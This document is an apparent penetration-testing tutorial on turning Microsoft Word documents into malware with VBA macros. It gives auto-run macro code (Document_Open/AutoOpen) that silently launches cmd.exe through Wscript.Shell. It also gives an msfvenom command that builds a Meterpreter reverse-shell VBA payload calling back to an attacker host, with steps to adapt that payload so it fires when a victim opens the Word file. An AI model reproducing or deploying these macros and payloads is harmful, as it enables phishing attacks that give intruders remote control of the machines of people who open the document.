# Visual Basic for Application - VBA

Visual Basic for Application - VBA, a programming language implemented by Microsoft for applications such as Microsoft Word, Excel, PowerPoint, etc... to automate tasks for almost all keyboard and mouse interactions between a user and Microsoft Office applications.


## Microsoft Word Macro
Use macros to create malicious Microsoft documents:

1. Create a new blank Microsoft document to create our first `macro`.

2. Now edit the Word document and create a macro function that executes `cmd.exe` or any executable file,

3. In order to automatically execute the VBA code once the document is opened, we can use built-in functions such as `AutoOpen` and `Document_open`.

```javascript
Sub Document_Open()
  PoC
End Sub

Sub AutoOpen()
  PoC
End Sub

Sub PoC()
	Dim payload As String
	payload = "cmd.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

4. It is important to note that for the macro to work, we must save it in _Macro-Enabled_ format such as `.doc` and `docm`.

5. Now save the file as a **`Word 97-2003 Document`** template


> **We can combine VBA with methods such as HTA and WSH. VBA/macros themselves do not intrinsically bypass detections.**


Now let's create a payload to receive a reverse shell.

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.128 LPORT=443 -f vba
```

NB: *A modification must be made for this to work.*

> The output will work on an MS Excel sheet. Therefore, replace `Workbook_Open()` with `Document_Open()` to make it suitable for MS Word documents.

> Once the malicious MS Word document is opened on the victim machine, we should receive a reverse shell.
